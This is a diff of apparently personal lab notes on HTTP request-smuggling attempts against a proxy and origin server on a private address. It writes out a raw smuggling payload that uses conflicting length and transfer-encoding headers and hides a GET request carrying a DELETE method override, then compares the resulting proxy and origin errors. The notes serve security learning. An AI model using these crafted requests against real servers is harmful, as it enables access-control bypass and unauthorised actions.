@@ -143,6 +143,64 @@ It doesn;t work.
 
 ![[Pasted image 20260612174018.png]]
 ![[Pasted image 20260613121317.png]]
+
+I gave the method in the main body itself what if I try it in the later part. 
+
+![[Pasted image 20260614123715.png]]
+
+POST /login HTTP/1.1
+Host: 192.168.1.77:5002
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:151.0) Gecko/20100101 Firefox/151.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Cache-Control: max-age=0
+Content-Length: 
+X-Hack-Mode: 1
+X-Content-Length: 1109
+X-Transfer-Encoding: chunked
+Origin: http://192.168.1.77:5002
+Connection: keep-alive
+Referer: http://192.168.1.77:5002/
+Cookie: hacker_token=22-s_yiTw1IDkQdzlq2xQkglg-22
+Upgrade-Insecure-Requests: 1
+Priority: u=0, i
+
+11
+name=tan&code=tan
+0
+
+GET /login HTTP/1.1
+X:
+Host: 192.168.1.77:5002
+X-HTTP-Method-Override: DELETE 
+X-Hack-Mode: 1
+X-Content-Length: 0
+Cookie: hacker_token=22-s_yiTw1IDkQdzlq2xQkglg-22
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:151.0) Gecko/20100101 Firefox/151.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.9
+Accept-Encoding: gzip, deflate
+
+![[Pasted image 20260614123426.png]]
+
+Now I am considering that x-content-length will be read by the origin
+
+![[Pasted image 20260614124211.png]]
+
+It says access denied though 
+
+![[Pasted image 20260614124237.png]]
+
+If i send again i get this 
+
+![[Pasted image 20260614124521.png]]
+
+![[Pasted image 20260614124509.png]]
+
+![[Pasted image 20260614125246.png]]
+
 ## Trying X- HTTPMetaCharacter (HMC)Attack
 
 ![[Pasted image 20260612174320.png]]
@@ -195,9 +253,37 @@ Metachar → similar potential but harder to execute (need real bytes, not text)
 
 ![[Pasted image 20260613140410.png]]
 
+I am not adding anything at X-Content-Length: 
+
 ![[Pasted image 20260613153316.png]]
 ![[Pasted image 20260613153332.png]]
 
 ![[Pasted image 20260613153359.png]]
 
-## Origin is looking at the chunk i.e, the transfer encoding. 
+![[Pasted image 20260613153425.png]]
+
+![[Pasted image 20260613153529.png]]
+
+#### Origin is looking at the chunk i.e, the transfer encoding. 
+
+![[Pasted image 20260613153835.png]]
+![[Pasted image 20260613153850.png]]
+
+Look at the error message carefully:
+
+```
+"Origin error: Invalid chunked body."
+```
+
+This is different from before! Previously it said:
+
+```
+"Proxy error: Invalid chunked body. Not forwarding."  ← proxy rejected it
+```
+
+Now it says:
+
+```
+"Origin error: Invalid chunked body."  ← origin rejected it!
+```
+
